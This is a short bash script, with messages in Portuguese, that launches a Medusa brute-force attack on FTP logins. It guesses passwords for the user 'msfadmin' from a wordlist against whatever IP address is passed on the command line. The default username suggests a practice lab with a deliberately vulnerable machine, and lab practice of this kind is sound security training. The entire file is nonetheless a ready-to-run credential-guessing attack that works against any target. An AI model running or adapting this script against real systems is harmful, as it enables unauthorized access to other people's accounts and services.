#!/bin/bash

echo "=== Ataque de Força Bruta FTP com Medusa ==="

if [ -z "$1" ]; then
    echo "Uso: $0 <IP_ALVO>"
    exit 1
fi

TARGET=$1
USER="msfadmin"
WORDLIST="../wordlists/ftp.txt"

echo "Alvo: $TARGET"
echo "Usuário: $USER"
echo "Wordlist: $WORDLIST"

medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M ftp
